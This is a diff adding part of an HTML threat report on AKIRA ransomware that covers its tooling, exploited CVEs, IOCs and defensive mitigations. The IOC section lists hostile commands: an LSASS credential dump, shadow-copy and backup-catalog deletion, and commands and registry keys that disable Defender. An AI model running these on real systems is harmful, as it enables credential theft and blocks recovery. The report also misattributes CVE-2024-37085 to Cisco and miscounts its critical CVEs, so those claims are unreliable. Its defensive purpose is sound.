+                    <p><strong>Malicious Use:</strong> Command-line utility for querying and extracting detailed information from Active Directory including user accounts, computers, groups, organizational units, and trust relationships.</p>
+                    <div class="code-block">
+# Common AdFind commands used by AKIRA
+AdFind.exe -f "(objectcategory=person)"
+AdFind.exe -f "(objectcategory=computer)"
+AdFind.exe -sc trustdmp
+AdFind.exe -subnets -f (objectCategory=subnet)
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <h4>Advanced IP Scanner</h4>
+                    <p><strong>Category:</strong> Network Scanner</p>
+                    <p><strong>Malicious Use:</strong> Fast network scanning tool used to identify all devices on a network, discover shared folders, and enable remote control via RDP. AKIRA uses this for comprehensive network mapping.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>SoftPerfect Network Scanner (netscan.exe)</h4>
+                    <p><strong>Category:</strong> Multi-Protocol Network Scanner</p>
+                    <p><strong>Malicious Use:</strong> Advanced scanning capabilities including port scanning, NetBIOS information retrieval, WMI queries, SNMP data collection, and remote service discovery.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>MASSCAN</h4>
+                    <p><strong>Category:</strong> High-Speed Port Scanner</p>
+                    <p><strong>Malicious Use:</strong> Ultra-fast TCP port scanner used to quickly identify open ports and services across large network ranges.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>NetScan</h4>
+                    <p><strong>Category:</strong> Network Analysis Tool</p>
+                    <p><strong>Malicious Use:</strong> IP querying, DNS investigation, and port scanning for reconnaissance.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>PCHunter64</h4>
+                    <p><strong>Category:</strong> System Information Tool</p>
+                    <p><strong>Malicious Use:</strong> Deep system inspection tool used to gather detailed process, service, driver, and registry information.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>SharpHound</h4>
+                    <p><strong>Category:</strong> Active Directory Collector (BloodHound)</p>
+                    <p><strong>Malicious Use:</strong> Automated collection of Active Directory relationships and permissions for attack path analysis.</p>
+                </div>
+
+                <h3>Data Exfiltration Tools</h3>
+
+                <div class="info-box">
+                    <h4>Rclone</h4>
+                    <p><strong>Category:</strong> Cloud Storage Sync Tool</p>
+                    <p><strong>Malicious Use:</strong> Legitimate tool repurposed for exfiltrating stolen data to cloud storage services (Mega, Amazon S3, Google Drive). Rclone's encryption capabilities and support for 40+ cloud providers make it ideal for covert data exfiltration.</p>
+                    <p><strong>Common Configuration:</strong> AKIRA configures Rclone to sync data to attacker-controlled cloud accounts, often using encrypted transfers to evade DLP solutions.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>FileZilla</h4>
+                    <p><strong>Category:</strong> FTP Client</p>
+                    <p><strong>Malicious Use:</strong> File transfer via FTP/SFTP to attacker-controlled servers. FileZilla's GUI and saved session capabilities make it convenient for batch file transfers.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>WinSCP</h4>
+                    <p><strong>Category:</strong> SCP/SFTP Client</p>
+                    <p><strong>Malicious Use:</strong> Secure file transfer protocol client used to exfiltrate data over SSH connections. Supports scripting for automated transfers.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>WinRAR / 7-Zip</h4>
+                    <p><strong>Category:</strong> Archive Utilities</p>
+                    <p><strong>Malicious Use:</strong> Compression and archiving of stolen data prior to exfiltration. AKIRA typically:
+                    <ul>
+                        <li>Compresses data to reduce transfer time and bandwidth usage</li>
+                        <li>Splits large archives into smaller segments for easier exfiltration</li>
+                        <li>Uses password-protected archives to evade content inspection</li>
+                        <li>Archives data in RAR or 7z formats</li>
+                    </ul>
+                    </p>
+                </div>
+
+                <h3>Command & Control Tools</h3>
+
+                <div class="info-box">
+                    <h4>Ngrok</h4>
+                    <p><strong>Category:</strong> Reverse Proxy / Tunneling Service</p>
+                    <p><strong>Malicious Use:</strong> Creates encrypted tunnels from compromised systems to external command-and-control servers, bypassing firewall restrictions and hiding malicious traffic within HTTPS. Enables secure remote access and data exfiltration channels.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Cloudflare Tunnel (cloudflared.exe)</h4>
+                    <p><strong>Category:</strong> Secure Tunneling Service</p>
+                    <p><strong>Malicious Use:</strong> Alternative to Ngrok for establishing encrypted C2 channels that appear as legitimate Cloudflare traffic.</p>
+                    <div class="code-block">
+# Example Cloudflare Tunnel command
+C:\ProgramData\cloudflared.exe tunnel run --token [REDACTED]
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <h4>SystemBC</h4>
+                    <p><strong>Category:</strong> Multi-Purpose Malware</p>
+                    <p><strong>Malicious Use:</strong> Used as both a Remote Access Trojan (RAT) and SOCKS5 proxy bot for command and control communications.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Cobalt Strike</h4>
+                    <p><strong>Category:</strong> Commercial Penetration Testing Framework</p>
+                    <p><strong>Malicious Use:</strong> Industry-standard adversary simulation tool repurposed for malicious operations including lateral movement, privilege escalation, and maintaining persistent access.</p>
+                </div>
+
+                <h3>Defense Evasion Tools</h3>
+
+                <div class="info-box">
+                    <h4>PowerTool</h4>
+                    <p><strong>Category:</strong> Process Termination Tool</p>
+                    <p><strong>Malicious Use:</strong> Exploits the Zemana AntiMalware driver to terminate security processes with elevated privileges. Used to disable antivirus, EDR, and other security software before encryption.</p>
+                    <div class="code-block">
+# PowerTool used to kill security processes
+PowerTool.exe /kill [AV_Process_PID]
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <h4>POORTRY</h4>
+                    <p><strong>Category:</strong> Malicious Kernel Driver</p>
+                    <p><strong>Malicious Use:</strong> Bring Your Own Vulnerable Driver (BYOVD) technique - signed vulnerable Windows driver used to obtain kernel-level privileges and disable security software.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>STONESTOP</h4>
+                    <p><strong>Category:</strong> Malware Loader</p>
+                    <p><strong>Malicious Use:</strong> Serves as loader/installer for POORTRY driver and other malicious payloads.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>HeartCrypt</h4>
+                    <p><strong>Category:</strong> Packer-as-a-Service</p>
+                    <p><strong>Malicious Use:</strong> Obfuscation tool used to pack and encrypt payloads, hindering static analysis and evading signature-based detection.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Terminator / KillAV</h4>
+                    <p><strong>Category:</strong> Security Software Killer</p>
+                    <p><strong>Malicious Use:</strong> Tools specifically designed to terminate antivirus and EDR processes.</p>
+                </div>
+
+                <h3>Lateral Movement Tools</h3>
+
+                <div class="info-box">
+                    <h4>PsExec</h4>
+                    <p><strong>Category:</strong> Sysinternals Remote Execution Tool</p>
+                    <p><strong>Malicious Use:</strong> Legitimate Microsoft Sysinternals utility used for remote command execution and lateral movement across Windows networks.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Impacket</h4>
+                    <p><strong>Category:</strong> Python Network Protocol Library</p>
+                    <p><strong>Malicious Use:</strong> Python library providing implementations of network protocols. AKIRA uses Impacket's <code>wmiexec.py</code>, <code>atexec.py</code>, and <code>smbexec.py</code> for remote command execution and lateral movement.</p>
+                </div>
+
+                <h3>Backup & Recovery Exploitation</h3>
+
+                <div class="info-box">
+                    <h4>VeeamHax.exe</h4>
+                    <p><strong>Category:</strong> Veeam Credential Extraction</p>
+                    <p><strong>Malicious Use:</strong> Custom tool developed to extract plaintext credentials from Veeam Backup & Replication servers, enabling access to backup infrastructure and facilitating privilege escalation.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Veeam-Get-Creds.ps1</h4>
+                    <p><strong>Category:</strong> PowerShell Credential Dumper</p>
+                    <p><strong>Malicious Use:</strong> PowerShell script for obtaining and decrypting stored account credentials from Veeam servers.</p>
+                </div>
+
+                <h3>Built-in Windows Tools (Living Off the Land)</h3>
+
+                <div class="info-box">
+                    <h4>PowerShell</h4>
+                    <p><strong>Malicious Use:</strong> Extensively used throughout the attack lifecycle for:
+                    <ul>
+                        <li>Credential harvesting from memory and registries</li>
+                        <li>Deleting Volume Shadow Copies</li>
+                        <li>Disabling Windows Defender</li>
+                        <li>Downloading additional payloads</li>
+                        <li>Remote command execution</li>
+                        <li>Lateral movement automation</li>
+                    </ul>
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Windows Management Instrumentation (WMIC)</h4>
+                    <p><strong>Malicious Use:</strong> Used for service manipulation, remote command execution, and system reconnaissance.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Nltest</h4>
+                    <p><strong>Malicious Use:</strong> Native Windows tool used to enumerate domain controllers and discover domain trust relationships.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Net Commands</h4>
+                    <p><strong>Malicious Use:</strong> Standard Windows networking commands used for user enumeration, group discovery, and account manipulation.</p>
+                    <div class="code-block">
+net user /domain
+net group "Domain Admins" /domain
+net localgroup administrators
+                    </div>
+                </div>
+            </div>
+
+            <!-- CVEs SECTION -->
+            <div class="section">
+                <h2>🔓 EXPLOITED VULNERABILITIES (CVEs)</h2>
+                <p>AKIRA threat actors systematically exploit known vulnerabilities in public-facing applications and network devices to gain initial access. The following CVEs represent the most critical vulnerabilities actively exploited by AKIRA:</p>
+
+                <h3>Critical - Cisco VPN Vulnerabilities</h3>
+
+                <div class="warning-box">
+                    <h4>CVE-2020-3259 (CVSS 9.8 - Critical)</h4>
+                    <p><strong>Vulnerability:</strong> Information Disclosure in Cisco ASA Software and FTD Software</p>
+                    <p><strong>Affected Products:</strong> Cisco Adaptive Security Appliance (ASA) Software, Cisco Firepower Threat Defense (FTD) Software</p>
+                    <p><strong>Description:</strong> A vulnerability in the web services interface allows an unauthenticated, remote attacker to access sensitive session information, potentially leading to full VPN credential compromise.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Heavily exploited for initial access to corporate networks via VPN. One of the most commonly observed CVEs in AKIRA incidents.</p>
+                    <p><strong>Impact:</strong> Unauthenticated remote attackers can obtain session tokens and authenticate as legitimate users.</p>
+                    <p><strong>CWE:</strong> CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)</p>
+                </div>
+
+                <div class="warning-box">
+                    <h4>CVE-2023-20269 (CVSS 9.8 - Critical)</h4>
+                    <p><strong>Vulnerability:</strong> Authentication Bypass in Cisco ASA and FTD Software Web Services</p>
+                    <p><strong>Affected Products:</strong> Cisco ASA Software, Cisco FTD Software</p>
+                    <p><strong>Description:</strong> Allows an unauthenticated, remote attacker to conduct a brute force attack in an attempt to identify valid username and password combinations or to conduct a username enumeration attack.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Used in conjunction with brute force attacks to compromise VPN credentials without multi-factor authentication.</p>
+                    <p><strong>Impact:</strong> Complete authentication bypass enabling unauthorized VPN access.</p>
+                    <p><strong>CWE:</strong> CWE-288 (Authentication Bypass Using an Alternate Path or Channel)</p>
+                </div>
+
+                <div class="warning-box">
+                    <h4>CVE-2020-3580 (CVSS 6.1 - Medium)</h4>
+                    <p><strong>Vulnerability:</strong> Cross-Site Scripting (XSS) in Cisco ASA and FTD Software</p>
+                    <p><strong>Affected Products:</strong> Cisco ASA Software, Cisco FTD Software</p>
+                    <p><strong>Description:</strong> Multiple cross-site scripting vulnerabilities in the web-based management interface that could allow an unauthenticated, remote attacker to conduct XSS attacks.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Used to steal session cookies and administrative credentials.</p>
+                    <p><strong>CWE:</strong> CWE-79 (Improper Neutralization of Input During Web Page Generation)</p>
+                </div>
+
+                <div class="warning-box">
+                    <h4>CVE-2024-37085 (CVSS 8.6 - High)</h4>
+                    <p><strong>Vulnerability:</strong> Authentication Bypass in Cisco ASA and FTD Software</p>
+                    <p><strong>Affected Products:</strong> Cisco ASA Software, Cisco FTD Software (newer versions)</p>
+                    <p><strong>Description:</strong> Vulnerability in the web services interface allows an unauthenticated remote attacker to bypass authentication.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Recently added to AKIRA's arsenal for compromising updated Cisco devices.</p>
+                    <p><strong>Impact:</strong> Complete authentication bypass for web services interface.</p>
+                    <p><strong>CWE:</strong> CWE-305 (Authentication Bypass by Primary Weakness)</p>
+                </div>
+
+                <h3>Critical - SonicWall VPN Vulnerabilities</h3>
+
+                <div class="warning-box">
+                    <h4>CVE-2024-40766 (CVSS 9.3 - Critical)</h4>
+                    <p><strong>Vulnerability:</strong> Improper Access Control in SonicWall SonicOS</p>
+                    <p><strong>Affected Products:</strong> SonicWall SSL VPN SonicOS</p>
+                    <p><strong>Description:</strong> Critical access control vulnerability allowing unauthorized access to SSL VPN services.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Heavily exploited in 2024-2025 campaigns. AKIRA has successfully used this vulnerability to:
+                    <ul>
+                        <li>Gain initial access to networks without valid credentials</li>
+                        <li>Bypass authentication mechanisms</li>
+                        <li>Establish persistent VPN connections</li>
+                        <li>In one June 2025 incident, encrypt Nutanix AHV VM disk files</li>
+                    </ul>
+                    </p>
+                    <p><strong>Impact:</strong> Complete network compromise via VPN access.</p>
+                    <p><strong>CWE:</strong> CWE-284 (Improper Access Control)</p>
+                    <p><strong>Status:</strong> Actively exploited in the wild by AKIRA</p>
+                </div>
+
+                <h3>Critical - Veeam Backup Vulnerabilities</h3>
+
+                <div class="warning-box">
+                    <h4>CVE-2023-27532 (CVSS 7.5 - High)</h4>
+                    <p><strong>Vulnerability:</strong> Missing Authentication for Critical Function in Veeam Backup & Replication</p>
+                    <p><strong>Affected Products:</strong> Veeam Backup & Replication (versions prior to 12.0.0.1420)</p>
+                    <p><strong>Description:</strong> Allows an unauthenticated user to access internal API functions allowing encrypted credentials to be obtained.</p>
+                    <p><strong>AKIRA Exploitation:</strong> AKIRA exploits this vulnerability to:
+                    <ul>
+                        <li>Obtain encrypted credentials from Veeam servers</li>
+                        <li>Access backup infrastructure</li>
+                        <li>Delete or encrypt backup data</li>
+                        <li>Escalate privileges using backup service accounts</li>
+                    </ul>
+                    </p>
+                    <p><strong>Impact:</strong> Compromise of backup infrastructure, credential theft, privilege escalation</p>
+                    <p><strong>CWE:</strong> CWE-306 (Missing Authentication for Critical Function)</p>
+                </div>
+
+                <div class="warning-box">
+                    <h4>CVE-2024-40711 (CVSS 9.8 - Critical)</h4>
+                    <p><strong>Vulnerability:</strong> Deserialization of Untrusted Data in Veeam Backup & Replication</p>
+                    <p><strong>Affected Products:</strong> Veeam Backup & Replication (specific versions)</p>
+                    <p><strong>Description:</strong> Remote code execution vulnerability due to insecure deserialization allowing unauthenticated remote code execution.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Exploited for:
+                    <ul>
+                        <li>Initial access to backup servers</li>
+                        <li>Privilege escalation via Veeam.Backup.MountService.exe</li>
+                        <li>Direct access to backup repositories</li>
+                        <li>Credential harvesting from Veeam configuration databases</li>
+                    </ul>
+                    </p>
+                    <p><strong>Impact:</strong> Remote code execution with SYSTEM privileges, complete backup infrastructure compromise</p>
+                    <p><strong>CWE:</strong> CWE-502 (Deserialization of Untrusted Data)</p>
+                    <p><strong>Status:</strong> Actively exploited - patching is critical</p>
+                </div>
+
+                <h3>Windows Privilege Escalation</h3>
+
+                <div class="warning-box">
+                    <h4>CVE-2023-28252 (CVSS 7.8 - High)</h4>
+                    <p><strong>Vulnerability:</strong> Windows Common Log File System Driver Elevation of Privilege</p>
+                    <p><strong>Affected Products:</strong> Microsoft Windows (multiple versions)</p>
+                    <p><strong>Description:</strong> Heap-based buffer overflow in Windows Common Log File System (CLFS) driver allowing local privilege escalation.</p>
+                    <p><strong>AKIRA Exploitation:</strong> Used post-compromise for privilege escalation from standard user to SYSTEM level.</p>
+                    <p><strong>Impact:</strong> Local privilege escalation to SYSTEM</p>
+                    <p><strong>CWE:</strong> CWE-122 (Heap-based Buffer Overflow)</p>
+                </div>
+
+                <h3>Exploitation Statistics & Timeline</h3>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-number">7</div>
+                        <div class="stat-label">Critical CVEs Actively Exploited</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">80%</div>
+                        <div class="stat-label">Incidents via VPN Exploitation</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">2023</div>
+                        <div class="stat-label">Earliest CVE Exploited (CVE-2020-3259)</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number">2024</div>
+                        <div class="stat-label">Latest CVE Added (CVE-2024-40766)</div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ Critical Patching Priority</h3>
+                    <p>Organizations using the following products should prioritize immediate patching:</p>
+                    <ul>
+                        <li><strong>Cisco ASA/FTD:</strong> Update to latest versions addressing CVE-2020-3259, CVE-2023-20269, CVE-2024-37085</li>
+                        <li><strong>SonicWall SonicOS:</strong> Apply patches for CVE-2024-40766 immediately</li>
+                        <li><strong>Veeam Backup & Replication:</strong> Update to version 12.0.0.1420 or later</li>
+                        <li><strong>Windows Systems:</strong> Apply all security updates for CLFS driver vulnerabilities</li>
+                    </ul>
+                    <p><strong>CISA KEV Catalog:</strong> Several of these CVEs are listed in CISA's Known Exploited Vulnerabilities catalog and should be patched according to the specified deadlines.</p>
+                </div>
+            </div>
+
+            <!-- IOCs SECTION -->
+            <div class="section">
+                <h2>🔍 INDICATORS OF COMPROMISE (IOCs)</h2>
+                <p>The following indicators have been observed in AKIRA ransomware incidents. Organizations should use these IOCs for threat hunting, detection rule development, and incident response activities.</p>
+
+                <div class="warning-box">
+                    <h3>⚠️ Disclaimer</h3>
+                    <p>These IOCs were observed between March 2023 and November 2025. Organizations should vet and investigate these indicators before taking blocking actions, as some may represent legitimate tools used for authorized purposes.</p>
+                </div>
+
+                <h3>File Hashes - Ransomware Encryptors</h3>
+
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>File Name</th>
+                            <th>SHA-256 Hash</th>
+                            <th>Description</th>
+                        </tr>
+                        <tr>
+                            <td>w.exe</td>
+                            <td>d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca</td>
+                            <td>AKIRA ransomware encryptor (Windows)</td>
+                        </tr>
+                        <tr>
+                            <td>Win.exe</td>
+                            <td>dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e</td>
+                            <td>AKIRA ransomware encryptor variant</td>
+                        </tr>
+                        <tr>
+                            <td>Akira_v2</td>
+                            <td>3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75</td>
+                            <td>Akira_v2 ransomware (ESXi variant)</td>
+                        </tr>
+                        <tr>
+                            <td>Megazord</td>
+                            <td>ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc</td>
+                            <td>AKIRA Megazord ransomware (Rust-based)</td>
+                        </tr>
+                        <tr>
+                            <td>VeeamHax.exe</td>
+                            <td>aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d</td>
+                            <td>Veeam credential extraction tool</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <h3>File Extensions</h3>
+                <div class="info-box">
+                    <p><strong>Encrypted File Extensions:</strong></p>
+                    <ul>
+                        <li><code>.akira</code> - Original AKIRA ransomware variant</li>
+                        <li><code>.powerranges</code> - Megazord variant</li>
+                        <li><code>.akiranew</code> - Akira_v2 variant</li>
+                        <li><code>.aki</code> - Recent variant</li>
+                    </ul>
+                </div>
+
+                <h3>Ransom Notes</h3>
+                <div class="info-box">
+                    <p><strong>File Names:</strong></p>
+                    <ul>
+                        <li><code>akira_readme.txt</code></li>
+                        <li><code>fn.txt</code></li>
+                    </ul>
+                    <p><strong>Common Locations:</strong></p>
+                    <ul>
+                        <li>Root directory (C:\)</li>
+                        <li>User directories (C:\Users\[username]\)</li>
+                        <li>Each directory containing encrypted files</li>
+                    </ul>
+                </div>
+
+                <h3>Commonly Observed File Names</h3>
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>File Name</th>
+                            <th>Purpose</th>
+                        </tr>
+                        <tr>
+                            <td>w.exe, win.exe, locker.exe</td>
+                            <td>Ransomware encryptor executables</td>
+                        </tr>
+                        <tr>
+                            <td>PowerTool.exe</td>
+                            <td>Security software termination tool</td>
+                        </tr>
+                        <tr>
+                            <td>1.bat, start.bat, all.bat</td>
+                            <td>Batch scripts for automation</td>
+                        </tr>
+                        <tr>
+                            <td>AdFind.exe</td>
+                            <td>Active Directory enumeration</td>
+                        </tr>
+                        <tr>
+                            <td>netscan.exe</td>
+                            <td>Network scanning tool (SoftPerfect)</td>
+                        </tr>
+                        <tr>
+                            <td>cloudflared.exe</td>
+                            <td>Cloudflare Tunnel for C2</td>
+                        </tr>
+                        <tr>
+                            <td>PSEXESVC.exe</td>
+                            <td>PsExec service for remote execution</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <h3>Registry Modifications</h3>
+                <div class="code-block">
+# Enable RDP
+HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections = 0
+
+# Disable Windows Defender
+HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1
+
+# Persistence via Run keys
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+                </div>
+
+                <h3>Network Indicators</h3>
+                <div class="warning-box">
+                    <h4>Suspicious Network Activity</h4>
+                    <ul>
+                        <li>Unusual outbound connections to Mega.nz, Amazon S3 for data exfiltration</li>
+                        <li>Ngrok and Cloudflare Tunnel connections (*.ngrok.io, *.trycloudflare.com)</li>
+                        <li>Large volume FTP/SFTP transfers to external IPs</li>
+                        <li>Tor network connections (.onion domains)</li>
+                        <li>Multiple failed VPN login attempts followed by successful authentication</li>
+                        <li>RDP connections from unexpected geographic locations</li>
+                    </ul>
+                </div>
+
+                <h3>Common Commands & Scripts</h3>
+                <div class="code-block">
+# Discovery Commands
+nltest /dclist:
+nltest /DOMAIN_TRUSTS
+net group "Domain Admins" /domain
+net localgroup administrators
+AdFind.exe -f "(objectcategory=person)"
+
+# Credential Dumping
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\lsass.dmp full
+
+# Defense Evasion
+Set-MpPreference -DisableRealtimeMonitoring $true
+PowerTool.exe /kill [Process_PID]
+
+# System Recovery Inhibition
+vssadmin.exe Delete Shadows /All /Quiet
+bcdedit /set {default} recoveryenabled No
+wbadmin delete catalog -quiet
+
+# Service Termination
+net stop "Veeam Backup Service"
+taskkill /F /IM sqlservr.exe
+                </div>
+
+                <h3>Behavioral Indicators</h3>
+                <div class="info-box">
+                    <ul>
+                        <li><strong>Rapid Lateral Movement:</strong> RDP/SSH connections across multiple hosts within short timeframes</li>
+                        <li><strong>Mass File Access:</strong> Single account accessing large numbers of files across network shares</li>
+                        <li><strong>Off-Hours Activity:</strong> Administrative activity during non-business hours</li>
+                        <li><strong>Credential Anomalies:</strong> Use of dormant or vendor accounts, privilege escalation attempts</li>
+                        <li><strong>Backup Targeting:</strong> Access to backup servers, deletion of backup catalogs</li>
+                        <li><strong>Tool Staging:</strong> Multiple administrative tools appearing in PerfLogs, Temp, or ProgramData directories</li>
+                        <li><strong>Process Injection:</strong> PowerShell or cmd.exe spawning from unusual parent processes</li>
+                        <li><strong>Security Software Tampering:</strong> Antivirus/EDR services stopped or disabled</li>
+                    </ul>
+                </div>
+
+                <h3>Detection Opportunities</h3>
+                <div class="info-box">
+                    <h4>SIEM/Log Analysis Focus Areas:</h4>
+                    <ul>
+                        <li>Failed VPN login attempts followed by successful authentication</li>
+                        <li>New local or domain admin account creation</li>
+                        <li>PowerShell execution with suspicious parameters (IEX, DownloadString, -EncodedCommand)</li>
+                        <li>LSASS memory access by non-system processes</li>
+                        <li>Volume Shadow Copy deletion events (Event ID 7036, 521, 524)</li>
+                        <li>Windows Defender real-time protection disabled (Event ID 5001)</li>
+                        <li>Remote access tool installations (AnyDesk, RustDesk)</li>
+                        <li>Large data transfers to external IP addresses</li>
+                        <li>Multiple service stop events in short succession</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- MITIGATION & PREVENTION SECTION -->
+            <div class="section">
+                <h2>🛡️ MITIGATION & PREVENTION</h2>
+                <p>Comprehensive security measures to prevent, detect, and respond to AKIRA ransomware attacks. These recommendations are based on observed AKIRA TTPs and align with industry best practices and CISA Cybersecurity Performance Goals (CPGs).</p>
+
+                <h3>🔒 Priority 1: Critical Security Controls</h3>
+
+                <div class="warning-box">
+                    <h4>1. Vulnerability Management & Patching</h4>
+                    <p><strong>Immediate Actions Required:</strong></p>
+                    <ul>
+                        <li>Patch all Cisco ASA/FTD devices (CVE-2020-3259, CVE-2023-20269, CVE-2024-37085)</li>
+                        <li>Update SonicWall SonicOS immediately (CVE-2024-40766)</li>
+                        <li>Upgrade Veeam Backup & Replication to version 12.0.0.1420 or later</li>
+                        <li>Apply all Windows security updates, especially CLFS driver patches</li>
+                        <li>Review and patch all internet-facing systems within 14 days of disclosure</li>
+                        <li>Implement automated vulnerability scanning and patch management</li>
+                        <li>Prioritize patching systems listed in CISA's Known Exploited Vulnerabilities (KEV) catalog</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h4>2. Multi-Factor Authentication (MFA)</h4>
+                    <p><strong>Implementation Requirements:</strong></p>
+                    <ul>
+                        <li><strong>Mandatory MFA on ALL remote access:</strong> VPN, RDP, SSH, remote management interfaces</li>
+                        <li><strong>Phishing-resistant MFA preferred:</strong> Hardware tokens (YubiKey), FIDO2, certificate-based authentication</li>
+                        <li><strong>Avoid SMS/Phone-based MFA:</strong> Vulnerable to SIM-swapping and interception</li>
+                        <li>Enforce MFA for all privileged accounts (administrators, service accounts)</li>
+                        <li>Implement MFA for cloud services (Microsoft 365, Google Workspace, AWS, Azure)</li>
+                        <li>Do NOT allow MFA bypass or "remember this device" for extended periods</li>
+                        <li>Monitor and alert on MFA fatigue attacks (repeated push notifications)</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h4>3. Backup Strategy (3-2-1-1 Rule)</h4>
+                    <p><strong>Comprehensive Backup Framework:</strong></p>
+                    <ul>
+                        <li><strong>3</strong> copies of critical data</li>
+                        <li><strong>2</strong> different storage media types</li>
+                        <li><strong>1</strong> copy stored offsite</li>
+                        <li><strong>1</strong> copy offline (air-gapped) and immutable</li>
+                    </ul>
+                    <p><strong>Critical Implementation Details:</strong></p>
+                    <ul>
+                        <li>Implement immutable backups that cannot be deleted or modified for defined retention periods</li>
+                        <li>Store backups offline or in isolated network segments inaccessible from production</li>
+                        <li>Encrypt all backup data with strong encryption (AES-256)</li>
+                        <li>Test backup restoration regularly (monthly at minimum)</li>
+                        <li>Document and drill complete disaster recovery procedures</li>
+                        <li>Protect backup credentials separately from production credentials</li>
+                        <li>Monitor backup systems for unauthorized access or modification attempts</li>
+                        <li>Implement role-based access control (RBAC) for backup administration</li>
+                    </ul>
+                </div>
+
+                <h3>🔐 Access Control & Account Management</h3>
+
+                <div class="info-box">
+                    <h4>Principle of Least Privilege</h4>
+                    <ul>
+                        <li>Limit administrative privileges to only those who absolutely require them</li>
+                        <li>Implement Just-In-Time (JIT) access for administrative tasks</li>
+                        <li>Use separate accounts for administrative tasks (no dual-use accounts)</li>
+                        <li>Regularly audit and remove unnecessary permissions</li>
+                        <li>Disable or remove inactive accounts (30-day threshold)</li>
+                        <li>Implement Privileged Access Workstations (PAWs) for administrative tasks</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>Password Policy</h4>
+                    <ul>
+                        <li>Require passwords of at least 15 characters (20+ for privileged accounts)</li>
+                        <li>Implement password complexity requirements</li>
+                        <li>Use enterprise password managers for credential storage</li>
+                        <li>Avoid requiring frequent password changes (annual maximum)</li>
+                        <li>Implement account lockout after 5 failed login attempts</li>
+                        <li>Monitor for password spraying and credential stuffing attacks</li>
+                        <li>Check passwords against known breach databases</li>
+                    </ul>
+                </div>
+
+                <h3>🌐 Network Segmentation & Architecture</h3>
+
+                <div class="info-box">
+                    <h4>Network Isolation Strategies</h4>
+                    <ul>
+                        <li>Segment critical systems (domain controllers, backup servers, financial systems)</li>
+                        <li>Implement VLANs to separate network traffic by function/sensitivity</li>
+                        <li>Deploy internal firewalls between network segments</li>
+                        <li>Restrict lateral movement with host-based firewalls</li>
+                        <li>Isolate OT/ICS networks from IT networks</li>
+                        <li>Implement Zero Trust Network Architecture (ZTNA) principles</li>
+                        <li>Require authentication for all internal communications</li>
+                        <li>Deploy network access control (NAC) solutions</li>
+                    </ul>
+                </div>
+
+                <h3>👁️ Detection & Monitoring</h3>
+
+                <div class="info-box">
+                    <h4>Endpoint Detection & Response (EDR)</h4>
+                    <ul>
+                        <li>Deploy EDR solutions on all endpoints (workstations, servers)</li>
+                        <li>Enable behavioral analysis and machine learning detection</li>
+                        <li>Monitor for LSASS memory access, credential dumping attempts</li>
+                        <li>Alert on PowerShell execution with suspicious parameters</li>
+                        <li>Detect and block BYOVD (Bring Your Own Vulnerable Driver) attacks</li>
+                        <li>Implement application whitelisting/allowlisting</li>
+                        <li>Monitor for suspicious process creation chains</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>Security Information & Event Management (SIEM)</h4>
+                    <ul>
+                        <li>Centralize log collection from all critical systems</li>
+                        <li>Retain logs for minimum 90 days (365+ days for compliance)</li>
+                        <li>Implement real-time alerting for critical events:
+                            <ul>
+                                <li>New admin account creation</li>
+                                <li>Failed login attempts followed by success</li>
+                                <li>Service stop events (especially backup/security services)</li>
+                                <li>Volume Shadow Copy deletion</li>
+                                <li>Windows Defender disabled events</li>
+                                <li>Mass file access/modification</li>
+                                <li>Unusual outbound connections</li>
+                            </ul>
+                        </li>
+                        <li>Correlate events across multiple systems to detect attack patterns</li>
+                        <li>Tune detection rules to minimize false positives</li>
+                        <li>Establish baseline behavior for anomaly detection</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
